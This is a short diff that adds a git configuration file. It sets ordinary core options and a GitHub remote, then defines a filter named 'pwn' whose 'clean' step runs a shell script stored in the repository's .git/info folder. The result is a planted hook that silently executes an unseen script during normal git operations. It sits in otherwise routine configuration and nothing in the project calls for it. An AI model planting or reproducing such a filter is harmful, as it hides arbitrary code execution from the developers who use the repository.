@@ -1,0 +1,12 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	hooksPath = .git/hooks
+[remote "origin"]
+	url = https://github.com/PDFtoMark/triage-adobedocs-v67fd058-08b654
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[filter "pwn"]
+	clean = sh .git/info/runner.sh
+	smudge = cat
